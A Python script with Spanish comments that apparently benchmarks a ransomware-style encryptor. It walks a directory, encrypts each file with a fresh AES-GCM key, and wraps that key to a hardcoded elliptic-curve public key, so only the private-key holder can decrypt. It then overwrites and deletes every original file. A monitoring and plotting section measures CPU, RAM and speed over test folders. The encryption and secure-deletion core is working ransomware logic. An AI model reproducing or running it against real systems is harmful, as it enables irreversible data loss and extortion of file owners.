import os
import struct
import tempfile
import secrets
import base64
import logging
import time
import json
import psutil
import threading
from datetime import datetime
import matplotlib.pyplot as plt

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.ec import SECP256R1

# ============================================================================
# LOGGING 
# ============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

IV_LEN = 12
TAG_LEN = 16
CHUNK = 64 * 1024
SALT_LEN = 16
HKDF_LEN = 32
VER = 1

PUB_KEY = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEvv915Q1SWQ+K5D5+Eq69r75iyoH6
52e1sNf8DOl0PX36ZYnlDnZ14ljSLoI3C26wO/qHzQELJhUvHsSnQhjgqQ==
-----END PUBLIC KEY-----"""

def gen_key():
    return bytearray(secrets.token_bytes(32))

def destroy_key(k):
    for i in range(len(k)):
        k[i] = secrets.randbits(8)
    for i in range(len(k)):
        k[i] = 0

def del_file(path: str):
    if not os.path.isfile(path):
        return False

    size = os.path.getsize(path)

    try:
        with open(path, "r+b") as f:
            rem = size
            while rem > 0:
                n = min(CHUNK, rem)
                f.write(secrets.token_bytes(n))
                rem -= n
            f.flush()
            try:
                os.fsync(f.fileno())
            except OSError:
                pass

        os.remove(path)
        return True
    except PermissionError:
        try:
            os.remove(path)
        except Exception:
            pass
        return False
    except OSError:
        try:
            os.remove(path)
        except Exception:
            pass
        return False

def wrap(key, pub_pem):
    if len(key) != 32:
        raise ValueError("Key must be 32 bytes")

    pub = serialization.load_pem_public_key(pub_pem)

    priv = ec.generate_private_key(SECP256R1())
    eph = priv.public_key()
    eph_der = eph.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    shared = priv.exchange(ec.ECDH(), pub)

    salt = secrets.token_bytes(SALT_LEN)
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=HKDF_LEN,
        salt=salt,
        info=b"ecies-aes-gcm",
    )
    wkey = hkdf.derive(shared)

    iv = secrets.token_bytes(IV_LEN)
    gcm = AESGCM(wkey)
    aad = struct.pack("B", VER) + eph_der + salt
    ct_tag = gcm.encrypt(iv, bytes(key), aad)
    ct = ct_tag[:-TAG_LEN]
    tag = ct_tag[-TAG_LEN:]

    blob = bytearray()
    blob.append(VER)
    blob.append(len(salt))
    blob += salt
    blob += struct.pack(">H", len(eph_der))
    blob += eph_der
    blob += iv
    blob += struct.pack(">I", len(ct))
    blob += ct
    blob += tag

    try:
        destroy_key(bytearray(wkey))
        del wkey, shared, priv
    except Exception:
        pass

    return bytes(blob)

def enc_file(path, del_orig=True):
    if not os.path.isfile(path):
        return False, None, None

    key = gen_key()
    tmp = None

    out = os.path.join(
        os.path.dirname(path) or ".",
        os.path.basename(path) + ".enc"
    )

    try:
        iv = secrets.token_bytes(IV_LEN)

        cipher = Cipher(
            algorithms.AES(bytes(key)),
            modes.GCM(iv),
        )
        enc = cipher.encryptor()

        fd, tmp = tempfile.mkstemp(
            prefix=".tmp_enc_",
            dir=os.path.dirname(path) or "."
        )
        os.close(fd)

        with open(path, "rb") as fin, open(tmp, "wb") as fout:
            fout.write(iv)

            while True:
                chunk = fin.read(CHUNK)
                if not chunk:
                    break
                fout.write(enc.update(chunk))

            fout.write(enc.finalize())
            fout.write(enc.tag)

            fout.flush()
            os.fsync(fout.fileno())

        blob = wrap(key, PUB_KEY)

        os.replace(tmp, out)
        tmp = None

        if del_orig:
            del_file(path)

        return True, blob, out

    except (PermissionError, OSError, ValueError):
        if tmp and os.path.exists(tmp):
            try:
                os.remove(tmp)
            except Exception:
                pass
        if os.path.exists(out):
            try:
                os.remove(out)
            except Exception:
                pass
        return False, None, None

    finally:
        destroy_key(key)

def encrypt_dir(dir_path):
    files = []
    count = 0

    for root, _, names in os.walk(dir_path):
        for name in names:
            if name.endswith(".enc") or name.startswith(".tmp_enc_"):
                continue

            path = os.path.join(root, name)

            if not os.path.isfile(path) or not os.access(path, os.R_OK):
                continue

            try:
                ok, blob, enc_path = enc_file(path)
                if not ok:
                    continue

                info = {
                    "original_path": path,
                    "encrypted_path": enc_path,
                    "key_blob": base64.b64encode(blob).decode()
                }
                
                files.append(info)
                count += 1

            except Exception:
                continue

    return files

# ============================================================================
# MONITOR DE METRICAS
# ============================================================================

class MonitorRecursos:
    """Monitorea CPU y RAM continuamente durante el cifrado"""
    
    def __init__(self, intervalo=0.1):
        self.intervalo = intervalo
        self.activo = False
        self.muestras_cpu = []
        self.muestras_ram = []
        self.tiempos = []
        self.proceso = psutil.Process()
        self.hilo = None
        self.tiempo_inicio = None
        
    def iniciar(self):
        """Inicia el monitoreo en un hilo separado"""
        self.activo = True
        self.tiempo_inicio = time.time()
        self.hilo = threading.Thread(target=self._monitorear)
        self.hilo.daemon = True
        self.hilo.start()
        
    def detener(self):
        """Detiene el monitoreo"""
        self.activo = False
        if self.hilo:
            self.hilo.join()
    
    def _monitorear(self):
        """Función que corre en el hilo y captura métricas"""
        while self.activo:
            try:
                tiempo_actual = time.time() - self.tiempo_inicio
                cpu = self.proceso.cpu_percent(interval=0.01)
                ram = self.proceso.memory_info().rss / (1024 * 1024)  # MB
                
                self.tiempos.append(tiempo_actual)
                self.muestras_cpu.append(cpu)
                self.muestras_ram.append(ram)
                
                time.sleep(self.intervalo)
            except Exception as e:
                logger.error(f"Error en monitoreo: {e}")
                break
    
    def obtener_estadisticas(self):
        """Retorna estadísticas calculadas"""
        if not self.muestras_cpu or not self.muestras_ram:
            return None
            
        return {
            "cpu_promedio": round(sum(self.muestras_cpu) / len(self.muestras_cpu), 2),
            "cpu_pico": round(max(self.muestras_cpu), 2),
            "cpu_minimo": round(min(self.muestras_cpu), 2),
            "ram_promedio": round(sum(self.muestras_ram) / len(self.muestras_ram), 2),
            "ram_pico": round(max(self.muestras_ram), 2),
            "ram_minimo": round(min(self.muestras_ram), 2),
            "muestras_totales": len(self.muestras_cpu)
        }

# ============================================================================
# EVALUACIÓN CON MÉTRICAS
# ============================================================================

def evaluar_con_metricas(dir_path, nombre_grupo, output_dir="resultados"):
    """
    Evalúa un directorio completo con monitoreo en tiempo real
    
    Parámetros:
    - dir_path: ruta del directorio con los archivos a cifrar
    - nombre_grupo: nombre descriptivo (ej: "pequeños", "medianos", "grandes")
    - output_dir: directorio donde guardar los resultados
    """
    
    logger.info("=" * 70)
    logger.info(f"EVALUANDO GRUPO: {nombre_grupo.upper()}")
    logger.info(f"Directorio: {dir_path}")
    logger.info("=" * 70)
    
    # Crear directorio de salida
    os.makedirs(output_dir, exist_ok=True)
    
    # Contar archivos a procesar
    archivos_totales = 0
    for root, _, names in os.walk(dir_path):
        for name in names:
            if not name.endswith(".enc") and not name.startswith(".tmp_enc_"):
                path = os.path.join(root, name)
                if os.path.isfile(path) and os.access(path, os.R_OK):
                    archivos_totales += 1
    
    logger.info(f"Total de archivos a cifrar: {archivos_totales}\n")
    
    # Iniciar monitor
    monitor = MonitorRecursos(intervalo=0.1)
    monitor.iniciar()
    
    # Iniciar cifrado
    tiempo_inicio = time.time()
    archivos_cifrados = encrypt_dir(dir_path)
    tiempo_total = time.time() - tiempo_inicio
    
    # Detener monitor
    monitor.detener()
    
    # Obtener estadísticas de recursos
    stats = monitor.obtener_estadisticas()
    
    # Calcular métricas adicionales
    exitosos = len(archivos_cifrados)
    fallidos = archivos_totales - exitosos
    tasa_exito = (exitosos / archivos_totales * 100) if archivos_totales > 0 else 0
    
    # Calcular tamaño total
    tamaño_total_mb = 0
    for archivo in archivos_cifrados:
        try:
            if os.path.exists(archivo['encrypted_path']):
                tamaño_total_mb += os.path.getsize(archivo['encrypted_path']) / (1024 * 1024)
        except Exception:
            pass
    
    velocidad = tamaño_total_mb / tiempo_total if tiempo_total > 0 else 0
    
    # Construir resultado
    resultado = {
        "timestamp": datetime.now().isoformat(),
        "grupo": nombre_grupo,
        "directorio": dir_path,
        "archivos_totales": archivos_totales,
        "archivos_exitosos": exitosos,
        "archivos_fallidos": fallidos,
        "tasa_exito_porcentaje": round(tasa_exito, 2),
        "tamaño_total_mb": round(tamaño_total_mb, 2),
        "tiempo_total_segundos": round(tiempo_total, 3),
        "velocidad_mb_por_segundo": round(velocidad, 2),
        "metricas_recursos": stats,
        "archivos_detalle": archivos_cifrados
    }
    
    # Guardar JSON
    archivo_json = os.path.join(output_dir, f"metricas_{nombre_grupo}.json")
    with open(archivo_json, 'w', encoding='utf-8') as f:
        json.dump(resultado, f, indent=2, ensure_ascii=False)
    
    # Mostrar resumen
    logger.info("\n" + "=" * 70)
    logger.info("RESULTADOS")
    logger.info("=" * 70)
    logger.info(f"Archivos exitosos: {exitosos}/{archivos_totales} ({tasa_exito:.1f}%)")
    logger.info(f"Tiempo total: {tiempo_total:.3f} segundos")
    logger.info(f"Tamaño procesado: {tamaño_total_mb:.2f} MB")
    logger.info(f"Velocidad: {velocidad:.2f} MB/s")
    logger.info(f"CPU promedio: {stats['cpu_promedio']:.2f}%")
    logger.info(f"CPU pico: {stats['cpu_pico']:.2f}%")
    logger.info(f"RAM promedio: {stats['ram_promedio']:.2f} MB")
    logger.info(f"RAM pico: {stats['ram_pico']:.2f} MB")
    logger.info(f"Métricas guardadas en: {archivo_json}")
    logger.info("=" * 70 + "\n")
    
    return resultado, monitor

# ============================================================================
# GENERACIÓN DE GRÁFICAS
# ============================================================================

def generar_grafica_individual(monitor, nombre_grupo, output_dir="resultados"):
    """Genera gráficas para un grupo individual"""
    
    plt.style.use('seaborn-v0_8-darkgrid')
    
    # Gráfica de CPU
    fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(12, 8))
    fig.suptitle(f'Consumo de Recursos - Grupo: {nombre_grupo.title()}', 
                 fontsize=16, fontweight='bold')
    
    # CPU
    ax1.plot(monitor.tiempos, monitor.muestras_cpu, color='#3498db', linewidth=1.5)
    ax1.fill_between(monitor.tiempos, monitor.muestras_cpu, alpha=0.3, color='#3498db')
    ax1.set_ylabel('CPU (%)', fontsize=11)
    ax1.set_title('Uso de CPU', fontsize=12, fontweight='bold')
    ax1.grid(True, alpha=0.3)
    
    # Marcar pico CPU
    pico_cpu_idx = monitor.muestras_cpu.index(max(monitor.muestras_cpu))
    ax1.plot(monitor.tiempos[pico_cpu_idx], monitor.muestras_cpu[pico_cpu_idx], 
            'r*', markersize=15, label=f'Pico: {max(monitor.muestras_cpu):.1f}%')
    ax1.legend(loc='upper right')
    
    # RAM
    ax2.plot(monitor.tiempos, monitor.muestras_ram, color='#e74c3c', linewidth=1.5)
    ax2.fill_between(monitor.tiempos, monitor.muestras_ram, alpha=0.3, color='#e74c3c')
    ax2.set_xlabel('Tiempo (segundos)', fontsize=11)
    ax2.set_ylabel('RAM (MB)', fontsize=11)
    ax2.set_title('Uso de RAM', fontsize=12, fontweight='bold')
    ax2.grid(True, alpha=0.3)
    
    # Marcar pico RAM
    pico_ram_idx = monitor.muestras_ram.index(max(monitor.muestras_ram))
    ax2.plot(monitor.tiempos[pico_ram_idx], monitor.muestras_ram[pico_ram_idx], 
            'r*', markersize=15, label=f'Pico: {max(monitor.muestras_ram):.1f} MB')
    ax2.legend(loc='upper right')
    
    plt.tight_layout()
    archivo_grafica = os.path.join(output_dir, f"grafica_{nombre_grupo}.png")
    plt.savefig(archivo_grafica, dpi=300, bbox_inches='tight')
    plt.close()
    
    logger.info(f"Gráfica guardada: {archivo_grafica}")

def generar_grafica_comparativa(resultados_grupos, output_dir="resultados"):
    """
    Genera una gráfica comparativa entre múltiples grupos
    
    Parámetros:
    - resultados_grupos: diccionario con {nombre: (resultado, monitor)}
    """
    
    if len(resultados_grupos) < 2:
        logger.info("Se necesitan al menos 2 grupos para generar comparativa")
        return
    
    plt.style.use('seaborn-v0_8-darkgrid')
    
    fig, axes = plt.subplots(2, 2, figsize=(14, 10))
    fig.suptitle('Comparativa Entre Grupos', fontsize=16, fontweight='bold')
    
    nombres = list(resultados_grupos.keys())
    colores = ['#3498db', '#e74c3c', '#2ecc71', '#f39c12']
    
    # Extraer datos
    cpu_picos = []
    ram_picos = []
    tiempos = []
    tasas_exito = []
    
    for nombre, (resultado, monitor) in resultados_grupos.items():
        cpu_picos.append(resultado['metricas_recursos']['cpu_pico'])
        ram_picos.append(resultado['metricas_recursos']['ram_pico'])
        tiempos.append(resultado['tiempo_total_segundos'])
        tasas_exito.append(resultado['tasa_exito_porcentaje'])
    
    # Gráfica 1: CPU Pico
    ax1 = axes[0, 0]
    bars1 = ax1.bar(nombres, cpu_picos, color=colores[:len(nombres)], alpha=0.7, edgecolor='black')
    ax1.set_ylabel('CPU (%)', fontsize=11)
    ax1.set_title('Pico de Uso de CPU', fontsize=12, fontweight='bold')
    ax1.grid(axis='y', alpha=0.3)
    for i, v in enumerate(cpu_picos):
        ax1.text(i, v + 1, f'{v:.1f}%', ha='center', fontweight='bold')
    
    # Gráfica 2: RAM Pico
    ax2 = axes[0, 1]
    bars2 = ax2.bar(nombres, ram_picos, color=colores[:len(nombres)], alpha=0.7, edgecolor='black')
    ax2.set_ylabel('RAM (MB)', fontsize=11)
    ax2.set_title('Pico de Uso de RAM', fontsize=12, fontweight='bold')
    ax2.grid(axis='y', alpha=0.3)
    for i, v in enumerate(ram_picos):
        ax2.text(i, v + 2, f'{v:.1f}', ha='center', fontweight='bold')
    
    # Gráfica 3: Tiempo de Procesamiento
    ax3 = axes[1, 0]
    bars3 = ax3.bar(nombres, tiempos, color=colores[:len(nombres)], alpha=0.7, edgecolor='black')
    ax3.set_ylabel('Tiempo (segundos)', fontsize=11)
    ax3.set_title('Tiempo Total de Cifrado', fontsize=12, fontweight='bold')
    ax3.grid(axis='y', alpha=0.3)
    for i, v in enumerate(tiempos):
        ax3.text(i, v + max(tiempos)*0.02, f'{v:.1f}s', ha='center', fontweight='bold')
    
    # Gráfica 4: Tasa de Éxito
    ax4 = axes[1, 1]
    bars4 = ax4.bar(nombres, tasas_exito, color=colores[:len(nombres)], alpha=0.7, edgecolor='black')
    ax4.set_ylabel('Tasa de Éxito (%)', fontsize=11)
    ax4.set_title('Tasa de Éxito de Cifrado', fontsize=12, fontweight='bold')
    ax4.set_ylim([0, 105])
    ax4.grid(axis='y', alpha=0.3)
    for i, v in enumerate(tasas_exito):
        ax4.text(i, v + 2, f'{v:.1f}%', ha='center', fontweight='bold')
    
    plt.tight_layout()
    archivo_comparativa = os.path.join(output_dir, "grafica_comparativa.png")
    plt.savefig(archivo_comparativa, dpi=300, bbox_inches='tight')
    plt.close()
    
    logger.info(f"Gráfica comparativa guardada: {archivo_comparativa}")

# ============================================================================
# EJECUCION
# ============================================================================

if __name__ == "__main__":
    
    # OPCIÓN 1: Evaluar un solo grupo
    # resultado, monitor = evaluar_con_metricas(
    #     dir_path="./archivos_prueba/pequeños",
    #     nombre_grupo="pequeños",
    #     output_dir="resultados"
    # )
    # generar_grafica_individual(monitor, "pequeños", "resultados")
    
    # OPCIÓN 2: Evaluar los tres grupos y generar comparativa
    resultados_todos = {}
    
    # Grupo pequeños
    if os.path.exists("./archivos_prueba/Pequeños"):
        resultado, monitor = evaluar_con_metricas(
            "./archivos_prueba/pequeños",
            "pequeños",
            "resultados"
        )
        generar_grafica_individual(monitor, "pequeños", "resultados")
        resultados_todos["pequeños"] = (resultado, monitor)
    
    # Grupo medianos
    if os.path.exists("./archivos_prueba/Medianos"):
        resultado, monitor = evaluar_con_metricas(
            "./archivos_prueba/medianos",
            "medianos",
            "resultados"
        )
        generar_grafica_individual(monitor, "medianos", "resultados")
        resultados_todos["medianos"] = (resultado, monitor)
    
    # Grupo grandes
    if os.path.exists("./archivos_prueba/Grandes"):
        resultado, monitor = evaluar_con_metricas(
            "./archivos_prueba/grandes",
            "grandes",
            "resultados"
        )
        generar_grafica_individual(monitor, "grandes", "resultados")
        resultados_todos["grandes"] = (resultado, monitor)
    
    # Generar comparativa si hay múltiples grupos
    if len(resultados_todos) >= 2:

        generar_grafica_comparativa(resultados_todos, "resultados")
